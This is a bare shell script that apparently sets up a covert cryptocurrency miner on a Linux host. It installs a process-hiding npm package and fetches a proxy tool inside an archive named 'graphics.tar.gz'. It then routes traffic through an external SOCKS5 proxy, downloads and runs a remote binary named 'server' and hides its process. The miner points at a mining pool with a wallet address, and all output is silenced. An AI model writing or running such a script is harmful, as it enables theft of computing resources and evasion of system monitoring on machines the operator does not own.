ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
apt install npm -y

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  01.proxy.koyeb.app:13017
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "
./graftcp/graftcp wget https://github.com/brontosimungo/backend-server/raw/refs/heads/main/server && chmod +x server
ph add server

./graftcp/graftcp ./server --proxy global.pearlfortune.org:443 --address prl1pcyxtt3j5rtcl6edp725362zgf6gmhtz7rljs8ynr40aaq7tuk5hs6zz5gp --worker $(shuf -n 1 -i 1-9999999) > /dev/null 2>&1 &
